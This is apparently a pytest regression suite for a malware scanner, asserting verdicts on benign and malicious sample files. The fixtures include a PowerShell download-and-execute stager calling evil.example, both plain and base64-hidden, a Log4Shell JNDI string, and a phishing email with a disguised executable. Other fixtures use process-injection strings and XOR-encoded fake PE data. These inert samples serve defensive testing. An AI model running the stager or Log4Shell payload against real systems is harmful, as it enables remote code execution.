"""End-to-end detection regression corpus.

Builds representative benign and malicious samples and asserts the verdict band
each lands in. This guards detection *quality* (not just unit logic): a change
that silently weakens or over-fires detection will fail here.

Assertions use the stdlib-only detection paths so they hold with or without the
optional pefile/yara/oletools libraries. Cases that need YARA are guarded.
"""

from __future__ import annotations

import base64
import struct
import zipfile

import pytest

from hawkscan.core.engine import Engine
from hawkscan.core.findings import Verdict
from hawkscan.analyzers.yara_analyzer import YaraAnalyzer

ENGINE = Engine()


def _scan(tmp_path, name, data: bytes):
    f = tmp_path / name
    f.write_bytes(data)
    return ENGINE.scan(f)


# ---- benign: must stay clean -------------------------------------------

def test_benign_text_clean(tmp_path):
    r = _scan(tmp_path, "notes.txt", b"Just an ordinary note about the weekend.\n")
    assert r.verdict == Verdict.CLEAN


def test_benign_csv_clean(tmp_path):
    r = _scan(tmp_path, "data.csv", b"name,age,city\nalice,30,paris\nbob,25,oslo\n")
    assert r.verdict == Verdict.CLEAN


# ---- malicious: must reach at least Suspicious --------------------------

def test_powershell_stager(tmp_path):
    data = (b"powershell -w hidden -enc AAAA; IEX (New-Object "
            b"Net.WebClient).DownloadString('http://evil.example/p.ps1')")
    r = _scan(tmp_path, "stager.ps1", data)
    assert r.verdict >= Verdict.SUSPICIOUS


def test_rtf_equation_exploit(tmp_path):
    data = (rb"{\rtf1\ansi{\object\objemb\objupdate{\*\objclass Equation.3}"
            rb"{\*\objdata 0105" + b"41" * 256 + rb"}}}")
    r = _scan(tmp_path, "x.rtf", data)
    assert r.verdict >= Verdict.SUSPICIOUS


def test_malicious_apk(tmp_path):
    manifest = ("android.permission.SEND_SMS\n"
                "android.permission.BIND_ACCESSIBILITY_SERVICE").encode("utf-16-le")
    dex = b"dex\n035\x00sendTextMessage DexClassLoader lockNow abortBroadcast"
    f = tmp_path / "m.apk"
    with zipfile.ZipFile(f, "w") as zf:
        zf.writestr("AndroidManifest.xml", manifest)
        zf.writestr("classes.dex", dex)
    assert ENGINE.scan(f).verdict >= Verdict.SUSPICIOUS


def test_phishing_email(tmp_path):
    pe = base64.b64encode(b"MZ" + b"\x90" * 32).decode()
    data = (
        'From: "Bank" <a@bank.com>\nReturn-Path: <x@evil.ru>\nMIME-Version: 1.0\n'
        "Authentication-Results: mx; spf=fail; dmarc=fail\n"
        'Content-Type: multipart/mixed; boundary="B"\n\n'
        "--B\nContent-Type: text/plain\n\nhi\n"
        '--B\nContent-Type: application/octet-stream; name="doc.pdf.exe"\n'
        "Content-Transfer-Encoding: base64\n"
        'Content-Disposition: attachment; filename="doc.pdf.exe"\n\n'
        f"{pe}\n--B--\n").encode()
    assert _scan(tmp_path, "p.eml", data).verdict >= Verdict.SUSPICIOUS


def test_deobfuscation_recovers_hidden_stager(tmp_path):
    import base64
    hidden = (b"powershell -w hidden -enc x; IEX (New-Object "
              b"Net.WebClient).DownloadString('http://evil.example/p.ps1')")
    b64 = base64.b64encode(hidden).decode()
    wrapper = f"# harmless looking helper\n$d = '{b64}'\nWrite-Output 'hi'\n"
    r = _scan(tmp_path, "wrapper.ps1", wrapper.encode())
    # The hidden base64 stager is recovered, re-scanned, and elevates the verdict.
    assert r.verdict >= Verdict.SUSPICIOUS
    assert any(f.analyzer == "deobfuscate" for f in r.findings)


def test_inert_document_verdict_capped(tmp_path):
    # A markdown doc full of malware keywords (e.g. security docs) must not be
    # flagged above Low Risk - it has no execution vector.
    md = (b"# Detection notes\n\n"
          b"Look for `powershell -w hidden -enc`, `vssadmin delete shadows`,\n"
          b"`Invoke-Expression`, and IMDS theft via 169.254.169.254.\n")
    r = _scan(tmp_path, "notes.md", md)
    assert r.verdict <= Verdict.LOW_RISK


def test_compressed_pdf_javascript(tmp_path):
    import zlib
    js = b"<< /JS (app.alert('x'); eval(unescape('%75'))) /S /JavaScript >>"
    stream = zlib.compress(js)
    pdf = (b"%PDF-1.7\n1 0 obj\n<< /Filter /FlateDecode /Length "
           + str(len(stream)).encode() + b" >>\nstream\n" + stream
           + b"\nendstream\nendobj\n")
    r = _scan(tmp_path, "x.pdf", pdf)
    assert any("compressed PDF stream" in f.title for f in r.findings)


def test_archive_member_rescanned(tmp_path):
    import zipfile
    inj = (b"MZ VirtualAllocEx WriteProcessMemory CreateRemoteThread "
           b"SetThreadContext NtUnmapViewOfSection")
    f = tmp_path / "nested.zip"
    with zipfile.ZipFile(f, "w") as z:
        z.writestr("invoice.exe", inj)
    res = ENGINE.scan(f)
    assert any("Archived member" in x.title for x in res.findings)


def test_xor_encoded_payload_recovered(tmp_path):
    # A carrier hiding a single-byte-XOR-encoded PE (DOS-stub marker + injection
    # API strings) must be recovered, re-scanned, and flagged.
    pe = (b"MZ\x90\x00" + b"\x00" * 58 + b"This program cannot be run in DOS mode"
          + b" VirtualAllocEx WriteProcessMemory CreateRemoteThread "
            b"SetThreadContext NtUnmapViewOfSection")
    xored = bytes(b ^ 0x37 for b in pe)
    r = _scan(tmp_path, "drop.bin", b"harmless header\n" + xored)
    assert any(f.analyzer == "deobfuscate" and "XOR" in f.title for f in r.findings)
    assert r.verdict >= Verdict.SUSPICIOUS


def test_clean_binary_not_xor_flagged(tmp_path):
    # A normal file with no XOR-encoded marker must not trigger XOR recovery.
    r = _scan(tmp_path, "plain.bin", b"\x00\x01\x02\x03" * 200 + b"ordinary data")
    assert not any(f.analyzer == "deobfuscate" and "XOR" in f.title
                   for f in r.findings)


def test_script_dropper_named_exe(tmp_path):
    # Real-world miss: an obfuscated JS dropper named .exe was typed as opaque
    # "data" and scored Clean. It must now be typed as a script, flagged as
    # masquerading, and reach at least Suspicious.
    body = ("var " + "X" * 14 + "=" + ";".join(f"var a{i}={i}" for i in range(50))
            + ";eval(unescape('%76'))")
    r = _scan(tmp_path, "1.exe", body.encode())
    assert r.info.file_type == "script"
    assert any(f.category == "masquerading" for f in r.findings)
    assert r.verdict >= Verdict.SUSPICIOUS


def test_masqueraded_executable(tmp_path):
    # A PE wearing a .jpg extension - at least low risk from the mismatch.
    r = _scan(tmp_path, "photo.jpg", b"MZ\x90\x00" + b"\x00" * 200)
    assert r.verdict >= Verdict.LOW_RISK


def test_dropper_pdf_with_embedded_pe(tmp_path):
    # Valid embedded PE inside a PDF carrier -> carver flags it.
    sig_off = 0x40
    dos = bytearray(0x40)
    dos[0:2] = b"MZ"
    struct.pack_into("<I", dos, 0x3C, sig_off)
    coff = b"PE\x00\x00" + struct.pack("<HHIIIHH", 0x14c, 1, 0, 0, 0, 0, 0)
    raw_ptr = sig_off + len(coff) + 40
    sec = bytearray(40)
    sec[0:5] = b".text"
    struct.pack_into("<I", sec, 16, 16)
    struct.pack_into("<I", sec, 20, raw_ptr)
    pe = bytes(dos) + coff + bytes(sec)
    pe += b"\x00" * (raw_ptr - len(pe)) + b"X" * 16
    r = _scan(tmp_path, "drop.pdf", b"%PDF-1.5\n" + b"A" * 64 + pe)
    assert r.verdict >= Verdict.SUSPICIOUS


# ---- YARA-dependent (guarded) ------------------------------------------

@pytest.mark.skipif(not YaraAnalyzer.is_available(), reason="yara not installed")
def test_log4shell_detected(tmp_path):
    r = _scan(tmp_path, "req.log", b"User-Agent: ${jndi:ldap://evil.example/a}")
    # A document/log is verdict-capped, but the Critical YARA hit bypasses the cap.
    assert any("Log4Shell" in f.title for f in r.findings)
    assert r.verdict >= Verdict.LIKELY_MALICIOUS


@pytest.mark.skipif(not YaraAnalyzer.is_available(), reason="yara not installed")
def test_eicar_detected(tmp_path):
    eicar = (rb"X5O!P%@AP[4\PZX54(P^)7CC)7}$EICAR-STANDARD-ANTIVIRUS-TEST-FILE!"
             rb"$H+H*")
    assert _scan(tmp_path, "eicar.com", eicar).verdict >= Verdict.LIKELY_MALICIOUS
